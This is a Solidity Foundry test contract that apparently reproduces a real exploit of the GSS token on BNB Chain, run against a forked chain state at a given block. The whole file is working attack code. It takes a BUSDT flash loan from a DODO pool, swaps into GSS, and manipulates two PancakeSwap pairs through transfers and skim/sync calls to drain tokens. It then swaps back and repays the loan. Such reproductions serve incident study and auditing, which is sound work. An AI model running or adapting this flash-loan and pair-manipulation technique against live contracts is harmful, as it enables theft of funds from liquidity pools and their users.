// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// Phalcon Explorer: https://explorer.phalcon.xyz/tx/bsc/0x4f8cb9efb3cc9930bd38af5f5d34d15ce683111599a80df7ae50b003e746e336

contract GSSExploit is Test {
    IERC20 GSS = IERC20(0x37e42B961AE37883BAc2fC29207A5F88eFa5db66);
    IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IDPPOracle DPPOracle = IDPPOracle(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
    IPancakeRouter Router = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IPancakePair Pair = IPancakePair(0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0);
    IPancakePair GSSLPPair = IPancakePair(0xB4F4cD1cc2DfF1A14c4Aaa9E9434A92082855C64);
    function setUp() external {
        vm.createSelectFork("https://rpc.ankr.com/bsc", 31108555);
    }

    function testGSSExploit() external {
        deal(address(BUSDT),address(this), 0);
        emit log_named_decimal_uint("Attacker BUSDT Balance at start", BUSDT.balanceOf(address(this)), 18);
        BUSDT.approve(address(Router), type(uint).max);
        DPPOracle.flashLoan(0,30000 ether, address(this), 
        "0x00");
        emit log_named_decimal_uint("Attacker BUSDT Balance at end", BUSDT.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address sender, uint baseAmt, uint quoteAmt, bytes calldata data) external{
        address[] memory path = new address[](2);
        path[0] = address(BUSDT);
        path[1] = address(GSS);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(30000 ether, 0, path, address(this), block.timestamp + 1000);
        
        GSS.transfer(address(0x0000000000000000000000000000000000000001), 1);
        GSS.transfer(address(Pair), 707162351662098288993428);
        Pair.skim(address(GSSLPPair));
        Pair.sync();
        GSSLPPair.skim(address(this));

        GSS.approve(address(Router), type(uint).max);

        uint gssAmt = GSS.balanceOf(address(this));
        path[0] = address(GSS);
        path[1] = address(BUSDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(gssAmt, 0, path, address(this), block.timestamp + 1000);
        BUSDT.transfer(address(DPPOracle), 30000 ether);
    
}
}
